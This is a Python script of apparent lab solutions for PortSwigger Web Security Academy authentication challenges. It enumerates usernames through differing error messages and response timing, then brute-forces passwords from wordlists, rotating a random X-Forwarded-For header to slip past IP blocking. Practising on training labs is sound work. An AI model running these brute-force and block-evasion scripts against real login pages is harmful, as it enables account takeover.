import requests
import urllib.parse
import time

import random
import string

def get_random_string(length):
    # choose from all lowercase letter
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

#  This lab is vulnerable to username enumeration and password brute-force attacks. It has an 
# account with a predictable username and password, which can be found in the following wordlists:
# To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

#The username portion includes a response that tells you if the username is correct or not with a "Invalid username"
#message. This makes username enumeration easy
# with requests.Session() as s:
#     with open("usernames.txt", 'r') as userfile:
#         usernames = userfile.readlines()
#         for username in usernames:
#             username = username.strip()
#             session = s.post("https://0a7c00ad042529cbc0df5075004e0085.web-security-academy.net/login", data = {
#                 "username": username,
#                 "password": "rev"
#             })
#             print(username)
#             if "Invalid username" not in session.text:
#                 print(f"Username: {username}!!!")
#                 #Username is app1

#The password portion gave me a different error message based on the password being wrong which made this quite easy to enumerate.
# with requests.Session() as s:
#     with open("passwords.txt", 'r') as passfile:
#         passwords = passfile.readlines()
#         for password in passwords:
#             password = password.strip()
#             session = s.post("https://0a7c00ad042529cbc0df5075004e0085.web-security-academy.net/login", data = {
#                 "username": "app1",
#                 "password": password
#             })
#             print(password)
#             if "Incorrect password" not in session.text:
#                 print(f"Password: {password}!!!")
#                 exit(0)
#                 #Password is ginger


###
# This lab has subtly different responses based on an incorrect username and password. 
# First enumerate the username and then enumerate the password with the candidate lists provided. 
# with requests.Session() as s:
#     session = s.post("https://0a1b00e00459250ac0ef1568007f002f.web-security-academy.net/login", data = {
#                 "username": "howdy",
#                 "password": "howdy"
#             })
#     saved_response = session.text


#     with open("usernames.txt", 'r') as userfile:
#         usernames = userfile.readlines()
#         for username in usernames:
#             username = username.strip()
#             session = s.post("https://0a1b00e00459250ac0ef1568007f002f.web-security-academy.net/login", data = {
#                 "username": username,
#                 "password": "rev"
#             })
#             print(username)
#             if "<p class=is-warning>Invalid username or password.</p>" not in session.text:
#                 print(f"Username: {username}")
#                 exit(0)
#                 #Username is pi

# with requests.Session() as s:
#     with open("passwords.txt", 'r') as passfile:
#         passwords = passfile.readlines()
#         for password in passwords:
#             password = password.strip()
#             session = s.post("https://0a1b00e00459250ac0ef1568007f002f.web-security-academy.net/login", data = {
#                 "username": "pi",
#                 "password": password
#             })
#             print(password)
#             if "Invalid username or password" not in session.text:
#                 print(f"Password: {password}")
#                 exit(0)
#                 #Password is 11111111


#  This lab is vulnerable to username enumeration using its response times. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

#     Your credentials: wiener:peter
#     Candidate usernames
#     Candidate passwords

#The X-Forwarded-For defeats the IP block
#The solution was to measure how long it took for a bad response, then I created a badpassword that was 3000 characters long. 
#I iterated through all possible usernames until one took more than two seconds longer than the bad response. 
#This indicated that the application accepted the username and then tried to process the massive password.
badpassword = "rev" * 1000
possible_usernames = []
with requests.Session() as s:
    s.headers.update({"X-Forwarded-For": get_random_string(9)})
    start_time = time.time()
    session = s.post("https://0a7a006d03001381c17c5ac500da0014.web-security-academy.net/login", data = {
        "username": "bad",
        "password": badpassword
    })
    end_time = time.time()
bad_attempt = end_time - start_time
with open("usernames.txt", 'r') as userfile:
    usernames = userfile.readlines()
    for username in usernames:
        username = username.strip()
        with requests.Session() as s:
            s.headers.update({"X-Forwarded-For": get_random_string(9)})
            start_time = time.time()
            session = s.post("https://0a7a006d03001381c17c5ac500da0014.web-security-academy.net/login", data = {
                "username": username,
                "password": badpassword
            })
            end_time = time.time()
        real_attempt = end_time - start_time
        print(username)
        if abs(real_attempt - bad_attempt) > 2:
            print(f"Username: {username}")
            possible_usernames.append(username)
            #Username is ['administrator', 'am']
print(possible_usernames)


with open("passwords.txt", 'r') as passfile:
    passwords = passfile.readlines()
    for username in possible_usernames:
        for password in passwords:
            password = password.strip()
            with requests.Session() as s:
                s.headers.update({"X-Forwarded-For": get_random_string(9)})
                session = s.post("https://0a7a006d03001381c17c5ac500da0014.web-security-academy.net/login", data = {
                    "username": username,
                    "password": password
                })
                print(password)
                if "Invalid username or password." not in session.text:
                    print(f"{username}:{password}")
                    exit(0)
                    #Answer ajax:11111111